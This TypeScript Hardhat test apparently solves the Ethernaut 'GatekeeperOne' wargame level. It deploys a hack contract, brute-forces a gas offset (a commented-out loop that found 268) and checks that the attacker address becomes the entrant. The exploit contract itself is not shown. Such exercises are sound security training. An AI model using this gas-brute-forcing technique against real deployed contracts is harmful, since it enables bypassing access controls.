// Goal
// Register as an entrant.

import { ContractFactory, Signer } from 'ethers'
import { GatekeeperOne, GatekeeperOneHack } from '../../typechain-types'
import { ethers } from 'hardhat'
import { expect } from 'chai'

// Solution
describe('GatekeeperOne', function () {
  let GatekeeperOne: ContractFactory
  let gatekeeperOne: GatekeeperOne

  let GatekeeperOneHack: ContractFactory
  let gatekeeperOneHack: GatekeeperOneHack

  let signers: Signer[]
  let owner: Signer
  let attacker: Signer

  before(async function () {
    GatekeeperOne = await ethers.getContractFactory('GatekeeperOne')
    gatekeeperOne = (await GatekeeperOne.deploy()) as GatekeeperOne

    GatekeeperOneHack = await ethers.getContractFactory('GatekeeperOneHack')
    gatekeeperOneHack = (await GatekeeperOneHack.deploy(gatekeeperOne.address)) as GatekeeperOneHack

    signers = await ethers.getSigners()
    owner = signers[0]
    attacker = signers[1]
  })

  it('Should register as an entrant', async function () {
    // for (let i = 0; i < 1000; i++) {
    //   try {
    //     await gatekeeperOneHack.connect(attacker).attack(i, { gasLimit: 10000000 })
    //     console.log('success', i)
    //     break
    //   } catch (error) {
    //     console.log('failed')
    //     console.log(error)
    //   }
    // }

    // 268 is the correct gas nonce after trying 1000 times
    await gatekeeperOneHack.connect(attacker).attack(268, { gasLimit: 10000000 })

    const entrant = await gatekeeperOne.entrant()
    expect(entrant).to.equal(await attacker.getAddress())
  })
})
